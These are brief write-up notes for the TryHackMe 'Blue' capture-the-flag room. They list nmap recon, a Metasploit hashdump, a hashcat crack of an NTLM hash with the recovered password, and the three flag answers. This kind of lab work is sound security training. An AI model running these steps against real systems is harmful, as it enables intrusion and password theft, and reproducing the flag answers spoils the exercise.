# BLUE

link to the room: [https://tryhackme.com/room/blue]

`export IP=10.10.148.109`


## Recon

### Nmap
command: `nmap -sC -sV -vv -oN recon/nmap $IP`

### Gobuster


## TASK

### Gain access 

msfconsole: `spool scripts/msfconsole`

### CRACK

msfconsole: `hashdump`

hashcat: NTLM(1000) `hashcat -m 1000 ffb43f0de35be4d9917ac0cc8ad57f8d ~/Personal/tools/wordlists/rockyoutxt`

output: `ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22`

### FLAGS

```
cd /
cat flag1.txt
flag{access_the_machine}
---
cd \Windows\System32\config
cat flag2.txt
flag{sam_database_elevated_access}s

---
search -d /Users -f flag3*
cat /Users/Jon/Documents/flag3.txt
flag{admin_documents_can_be_valuable}    
```